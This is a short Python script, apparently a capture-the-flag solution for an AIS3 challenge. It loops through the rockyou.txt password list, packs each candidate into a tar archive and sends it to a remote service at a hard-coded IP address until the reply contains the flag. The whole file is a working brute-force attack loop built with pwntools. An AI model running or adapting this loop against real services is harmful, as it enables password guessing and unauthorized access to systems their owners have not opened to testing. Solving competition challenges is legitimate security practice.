import subprocess
import os 
from pwn import *
import random
import binascii
import hashlib
# context.log_level = 'DEBUG'
# os.chdir(os.path.dirname(__file__))
# path=os.path.join(os.getcwd(), 'guess.txt')
path='guess.txt'
# print(path)


wordlst=open('rockyou.txt','r')
str_in=wordlst.readline()
# print(str_in)
# for i in range(0,50):
while str_in:
    try:
        subprocess.check_output(['rm','guess.txt'])
    except:
        print('err')
    fi=open(path,"w+")
    
    # str_in=
    print(str_in)
    fi.write(str_in)
    fi.close()
    subprocess.check_output(['tar', '-cf', 'tmp.tar', 'guess.txt'])
    fb=open('tmp.tar',"rb")
    content=fb.read()
    fb.close()
    
    size=os.path.getsize('tmp.tar')
    # print(size)
    r=remote('60.250.197.227',11000)
    r.sendline(str(size))
    r.sendline(content)
    # print(r.recvall(timeout=30))
    rec=r.recvall()
    print(rec)
    if('AIS3'in rec):   
        break
    # if i==49:
    str_in=wordlst.readline()
    
        
    